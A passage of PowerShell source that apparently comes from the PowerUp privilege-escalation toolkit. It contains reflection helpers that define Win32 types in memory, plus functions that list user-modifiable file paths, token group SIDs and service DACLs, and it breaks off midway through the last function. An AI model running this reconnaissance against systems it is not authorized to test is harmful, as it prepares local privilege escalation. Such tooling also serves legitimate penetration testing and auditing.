

function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory=$True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# PowerUp Helpers
#
########################################################

function Get-ModifiablePath {
<#
    .SYNOPSIS

        Parses a passed string containing multiple possible file/folder paths and returns
        the file paths where the current user has modification rights.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        Takes a complex path specification of an initial file/folder path with possible
        configuration files, 'tokenizes' the string in a number of possible ways, and
        enumerates the ACLs for each path that currently exists on the system. Any path that
        the current user has modification rights on is returned in a custom object that contains
        the modifiable path, associated permission set, and the IdentityReference with the specified
        rights. The SID of the current user and any group he/she are a part of are used as the
        comparison set against the parsed path DACLs.

    .PARAMETER Path

        The string path to parse for modifiable files. Required

    .PARAMETER LiteralPaths

        Switch. Treat all paths as literal (i.e. don't do 'tokenization').

    .EXAMPLE

        PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath

        Path                       Permissions                IdentityReference
        ----                       -----------                -----------------
        C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
        C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...

    .EXAMPLE

        PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath

        Path                       Permissions                IdentityReference
        ----                       -----------                -----------------
        C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
        C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
        ...
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Switch]
        $LiteralPaths
    )

    BEGIN {
        # # false positives ?
        # $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if($PSBoundParameters['LiteralPaths']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    try {
                        $ParentPath = Split-Path $TempPath -Parent
                        if($ParentPath -and (Test-Path -Path $ParentPath)) {
                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                        # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if($TempPath -and ($TempPath -ne '')) {
                                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
                                        if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath )) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {
                                        # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                    }
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }

                    # the set of permission types that allow for modification
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                # translate the IdentityReference if it's a username and not a SID
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if($CurrentUserSids -contains $IdentitySID) {
                            New-Object -TypeName PSObject -Property @{
                                ModifiablePath = $CandidatePath
                                IdentityReference = $_.IdentityReference
                                Permissions = $Permissions
                            }
                        }
                    }
                }
            }
        }
    }
}


function Get-CurrentUserTokenGroupSid {
<#
    .SYNOPSIS

        Returns all SIDs that the current user is a part of, whether they are disabled or not.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        First gets the current process handle using the GetCurrentProcess() Win32 API call and feeds
        this to OpenProcessToken() to open up a handle to the current process token. The API call
        GetTokenInformation() is then used to enumerate the TOKEN_GROUPS for the current process
        token. Each group is iterated through and the SID structure is converted to a readable
        string using ConvertSidToStringSid(), and the unique list of SIDs the user is a part of
        (disabled or not) is returned as a string array.

    .LINK

        https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
        https://msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
        https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx
#>

    [CmdletBinding()]
    Param()

    $CurrentProcess = $Kernel32::GetCurrentProcess()

    $TOKEN_QUERY= 0x0008

    # open up a pseudo handle to the current process- don't need to worry about closing
    [IntPtr]$hProcToken = [IntPtr]::Zero
    $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Success) {
        $TokenGroupsPtrSize = 0
        # Initial query to determine the necessary buffer size
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)

        [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

        # query the current process token with the 'TokenGroups=2' TOKEN_INFORMATION_CLASS enum to retrieve a TOKEN_GROUPS structure
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($Success) {

            $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS

            For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                # convert each token group SID to a displayable string
                $SidString = ''
                $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if($Result -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                else {
                    $GroupSid = New-Object PSObject
                    $GroupSid | Add-Member Noteproperty 'SID' $SidString
                    # cast the atttributes field as our SidAttributes enum
                    $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                    $GroupSid
                }
            }
        }
        else {
            Write-Warning ([ComponentModel.Win32Exception] $LastError)
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
    }
    else {
        Write-Warning ([ComponentModel.Win32Exception] $LastError)
    }
}


function Add-ServiceDacl {
<#
    .SYNOPSIS

        Adds a Dacl field to a service object returned by Get-Service.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause

    .DESCRIPTION

        Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
        Dacl field to each object. It does this by opening a handle with ReadControl for the
        service with using the GetServiceHandle Win32 API call and then uses
        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

    .PARAMETER Name

        An array of one or more service names to add a service Dacl for. Passable on the pipeline.

    .EXAMPLE

        PS C:\> Get-Service | Add-ServiceDacl

        Add Dacls for every service the current user can read.

    .EXAMPLE

        PS C:\> Get-Service -Name VMTools | Add-ServiceDacl

        Add the Dacl to the VMTools service object.

    .OUTPUTS

        ServiceProcess.ServiceController

    .LINK

        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')

            $ReadControl = 0x00020000

            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))

            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

